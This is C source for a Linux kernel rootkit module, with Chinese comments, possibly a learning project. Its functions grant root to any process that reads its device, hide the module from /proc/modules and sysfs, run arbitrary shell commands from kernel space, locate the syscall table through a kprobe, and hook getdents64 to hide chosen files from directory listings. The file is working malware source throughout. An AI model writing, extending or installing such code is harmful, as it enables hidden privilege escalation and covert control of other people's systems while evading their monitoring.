#include <linux/fs.h>
#include <linux/module.h>
#include <linux/dirent.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/device.h>
#include <linux/kobject.h>
#include "asm/uaccess.h"
#include "rootkit.h"

// 修改cred获得root权限
static void get_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
    commit_creds(newcreds);
    // 第二种方法同样可行
    // commit_creds(prepare_creds(NULL);
}

static int rootkit_open(struct inode *__inode, struct file *__file)
{
    return 0;
}

static ssize_t rootkit_read(struct file *__file, char __user *user_buf, size_t size, loff_t *__loff)
{
    pr_info("rootkit read!!");
    get_root();
    return 0;
}

static ssize_t rootkit_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff)
{
    pr_info("rootkit wirte!!");
    return 0;
}

static int rootkit_release(struct inode *__inode, struct file *__file)
{
    return 0;
}

static long rootkit_ioctl(struct file *__file, unsigned int cmd, unsigned long param)
{
    return 0;
}

// 保存模块基本信息
static inline void module_info(void)
{
    module_prev = THIS_MODULE->list.prev;
    kobj_prev = THIS_MODULE->mkobj.kobj.entry.prev;
}

// 模块隐藏函数定义
static void hide_myself(void)
{
    // 摘除链表，/proc/modules中不可见
    list_del(&THIS_MODULE->list);

    list_del(&THIS_MODULE->mkobj.kobj.entry);

    pr_info("module hide success");
    // 摘除kobj，/sys/modules/中不可见。
    // kobject_del(&THIS_MODULE->mkobj.kobj);
}

// 模块隐藏恢复
static void show_myself(void)
{
    list_add(&THIS_MODULE->list, module_prev);
    list_add(&THIS_MODULE->mkobj.kobj.entry, kobj_prev);
    pr_info("module show success");
    // int err = kobject_add(kobj,NULL,"%s");
    // if (err)
    // {
    //     kobject_put(kobj);
    //     return;
    // }
}

// 命令执行模块
static char *exec_cmd(char *cmd)
{
    int result;
    loff_t pos;
    struct file *fp;
    static char buf[1024];
    char *cmd_path = "/bin/sh";
    char *output = " > /tmp/result.txt";
    char *tmp = kmalloc(256, GFP_KERNEL);
    strcpy(tmp, cmd);
    strcat(tmp, output);
    char *cmd_argv[] = {cmd_path, "-c", tmp, NULL};
    char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/user/bin", NULL};
    result = call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
    pr_info("[TestKthread]: call_usermodehelper() result is %d\n", result);
    kfree(tmp);

    fp = filp_open("/tmp/result.txt", O_RDWR | O_CREAT, 0644);
    if (IS_ERR(fp))
    {
        pr_info("open file failed!");
        return 0;
    }
    memset(buf, 0, sizeof(buf));
    pos = 0;
    kernel_read(fp, buf, sizeof(buf), &pos);
    pr_info("shell result %ld:\n", strlen(buf));
    pr_info("%s\n", buf);
    filp_close(fp, NULL);
    return buf;
}

// 获取系统调用表
long get_kallsyms_lookup(void)
{
    static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"};
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name_my;
    // 注册kprobe
    register_kprobe(&kp);

    kallsyms_lookup_name_my = (kallsyms_lookup_name_t)kp.addr;

    // 卸载kprobe
    unregister_kprobe(&kp);
    return kallsyms_lookup_name_my("sys_call_table");
}

// hookmkdir系统调用，拦截目录创建
asmlinkage long hook_mkdir(const struct pt_regs *regs)
{
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};
    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
    if (error > 0)
        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);
    return orig_mkdir(regs);
}

// 检查文件名是否为需要隐藏的文件名
int check(char *name)
{
    int i = 0;
    if (!strcmp(name, "Makefile") || !strcmp(name, "functions.c"))
        return 1;
    return 0;
}

// getdents64hook函数
asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    long ret;
    unsigned short len = 0;
    unsigned short tlen = 0;
    unsigned int fd;
    long error;
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *dirent_ker = NULL, *current_dir;
    unsigned int count;

    // 获取函数参数值
    fd = regs->di;
    dirent = regs->si;
    count = regs->dx;
    pr_info("getdents64 hook success!!");

    // 调用原始函数，截取返回值
    ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret < 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    tlen = ret;
    current_dir = dirent_ker;
    // 遍历文件节点列表，找到返回文件名
    while (tlen > 0)
    {
        len = current_dir->d_reclen;
        tlen = tlen - len;
        if (check(current_dir->d_name))
        {
            ret = ret - len;
            memmove(current_dir, (char *)current_dir + current_dir->d_reclen, tlen);
        }
        else
            current_dir = (struct linux_dirent64 *)((char *)current_dir + current_dir->d_reclen);
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;
done:
    kfree(dirent_ker);
    return ret;
}